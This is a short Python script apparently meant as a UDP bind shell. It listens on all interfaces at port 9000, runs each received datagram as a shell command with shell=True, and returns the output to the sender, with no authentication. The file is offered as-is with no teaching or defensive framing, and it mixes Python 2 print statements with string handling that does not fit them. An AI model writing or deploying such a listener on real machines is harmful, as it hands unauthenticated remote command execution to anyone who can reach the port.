import socket
import subprocess

BIND_IP = '0.0.0.0'
BIND_PORT = 9000

def udp_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(( BIND_IP, BIND_PORT))
    print "Waiting on port: " + str(BIND_PORT)

    while 1:
        data, addr = server.recvfrom(1024)
        print addr
        print "Let's run: " + data

        subprocess_cmd = data
        subprocess_output = subprocess.check_output(subprocess_cmd, shell=True)
        subprocess_output = subprocess_output.decode("utf8")
        subprocess_output = subprocess_output.strip()
        print(subprocess_output)

        server.sendto(subprocess_output, addr)

if __name__ == '__main__':
    udp_server()